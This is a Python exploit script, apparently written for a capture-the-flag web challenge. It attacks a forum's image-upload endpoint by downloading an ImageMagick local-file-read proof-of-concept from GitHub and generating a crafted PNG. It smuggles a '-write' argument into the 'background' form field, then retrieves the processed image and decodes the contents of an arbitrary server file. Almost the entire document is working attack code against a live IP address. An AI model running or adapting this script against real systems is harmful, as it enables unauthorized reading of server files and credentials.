import requests, os, random, string, time, re, subprocess, tempfile, sys

session = requests.Session()
proxy = {"http":"http://127.0.0.1:8080"}
file_to_obtain = sys.argv[1]


def get_exploit_poc():
    if not os.path.isfile("generate.py"):
        print("ImageMagick poc not found. Downloading file from github")
        os.system("wget https://raw.githubusercontent.com/Sybil-Scan/imagemagick-lfi-poc/main/generate.py 1>/dev/null 2>/dev/null")

def gen_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def create_exploit_png(lfi_payload, image_filepath):
    os.system(f"python3 generate.py -f '{lfi_payload}' -o {image_filepath} 1>/dev/null 2>/dev/null")


def login(url):
    login_url = f"{url}/auth/login"
    login_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:1337", "Connection": "close", "Referer": "http://127.0.0.1:1337/auth/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
    login_data = {"username": "asdasd", "password": "asdasd"}
    r = session.post(login_url, headers=login_headers, data=login_data, proxies=proxy)
    if "auth/login" in r.url:
        return False
    else:
        return True


def register(url):
    register_url = f"{url}/auth/register"
    register_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:1337", "Connection": "close", "Referer": "http://127.0.0.1:1337/auth/register", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
    register_data = {"username": "asdasd", "password": "asdasd"}
    session.post(register_url, headers=register_headers, data=register_data, proxies=proxy)


def get_session_cookies(url):
    if not login(url):
        register(url)
        login(url)

    print("Cookies obtained")


def send_exploit_request(url, image_filename, image_filepath):
    exploit_url = f"{url}/forum/post"

    files = [
        ('message', (None, 'bbbbbbrrrb')),
        ('rotate', (None, '90')),
        ('parentId', (None, '11')),
        ('format', (None, 'png')),
        ('background', (None, f'blue -write ./uploads/{image_filename}')),
        #('srcPath', (None, f'http://localhost/{image_filename}')),
        ('flip', (None, 'true')),
        ('image', (f"{image_filename}", open(image_filepath, 'rb'), 'image/png')),
    ]

    response = session.post(exploit_url, files=files, proxies=proxy)


def get_image(url, image_filename, new_image_filepath):
    r = session.get(f"{url}/uploads/{image_filename}")
    with open(new_image_filepath,"wb") as f:
        f.write(r.content)

def decode_image_data(new_image_filepath):
    cmd_output = subprocess.check_output(f"strings {new_image_filepath}", shell=True, text=True)
    extract1 = re.findall(r"txt(.*?jIDATx)",cmd_output,re.DOTALL)

    if len(extract1) >= 1:
        extract2 = re.findall(r"\n(.*?)jIDATx",extract1[0],re.DOTALL)
    else:
        cmd_output = subprocess.check_output(f"identify -verbose {new_image_filepath}", shell=True, text=True)
        extract1 = re.findall(r"Raw profile type:(.*?)signature",cmd_output,re.DOTALL)
        if len(extract1) < 1:
            extract1 = re.findall(r"Raw profile type:(.*?)Date",cmd_output,re.DOTALL)
        extract2 = re.findall(r"\n(.*?)\n",extract1[0],re.DOTALL)

    lfi_data = bytes.fromhex(''.join(extract2)).decode()
    print(lfi_data[1:])


def get_image_data_and_decode(url,image_filename,image_filepath):
    get_image(url, image_filename,image_filepath)
    decode_image_data(image_filepath)


def main():
    image_filename = gen_random_string(6) + ".png"
    image_filepath = f"/tmp/{image_filename}"
    exploited_image_filepath = f"/tmp/explo_{image_filename}"
    url = "http://167.172.62.51:30742"
    #url = "http://127.0.0.1:1337"
    get_exploit_poc()
    
    print("creating exploit")
    create_exploit_png(file_to_obtain, image_filepath)
    print("getting session cookies")
    get_session_cookies(url)
    print("sending exploit")
    send_exploit_request(url, image_filename, image_filepath)
    print(f"recovering image data:{image_filepath} \n")
    get_image_data_and_decode(url, image_filename,exploited_image_filepath)

if __name__ == '__main__':
    main()